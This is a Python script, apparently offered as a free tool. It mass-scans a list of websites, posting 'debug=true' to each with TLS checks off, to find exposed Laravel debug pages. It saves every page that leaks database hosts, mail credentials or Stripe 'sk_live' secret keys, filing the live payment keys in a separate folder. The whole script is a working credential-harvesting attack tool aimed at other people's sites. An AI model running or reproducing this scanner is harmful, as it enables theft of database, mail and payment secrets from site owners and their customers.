import re
import sys
import os
import time
import socket
import urllib3
import smtplib
import os.path
import requests
from os import path
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\u001B[0m'
    LXC = '\033[38;2;255;152;0m'
    GREY = '\033[38;2;158;158;158m'
    
class ENV :
   def scan (self, url):
      rr = ''
      mch = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME','sk_live', 'APP_DEBUG']
      try:
         data = {'debug': 'true'}
         r = requests.post(f'https://{url}', data=data, allow_redirects=False, verify=False, timeout=10)
         resp = r.text
         if any(key in resp for key in mch):
            rr = f'{xcol.LGREEN}[+]{xcol.RESET} : https://{url}'
            with open(os.path.join('DEBUG', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
               output.write(f'{resp}\n')
            if "sk_live" in resp:
               with open(os.path.join('SK', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
                  output.write(f'{resp}\n')
         else :
            rr = f'{xcol.LXC}[-] :{xcol.RESET} https://{url}'
      except :
         rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url}'
      print(rr)
if __name__ == '__main__':
   os.system('clear')
   print(""" \033[38;2;158;158;158m

██████╗ ███████╗██████╗ ██╗   ██╗ ██████╗ ██████╗ 
██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝ ██╔══██╗
██║  ██║█████╗  ██████╔╝██║   ██║██║  ███╗██████╔╝
██║  ██║██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔══██╗
██████╔╝███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
 
: FREE TOOL !
  \u001B[0m""")
   if not os.path.isdir("DEBUG"):
      os.makedirs("DEBUG")
   if not os.path.isdir("SK"):
      os.makedirs("SK")
   threads = []
   while(True):
      try:
         thrd = int(input(xcol.GREY+"[THREAD] : "+xcol.RESET))
         break
      except:
         pass
   while(True):
      try:
         inpFile = input(xcol.GREY+"[URLS PATH] : "+xcol.RESET)
         with open(inpFile) as urlList:
            argFile = urlList.read().splitlines()
         break
      except:
         pass
   with ThreadPoolExecutor(max_workers=thrd) as executor:
      for data in argFile:
         threads.append(executor.submit(ENV().scan, data))
   quit()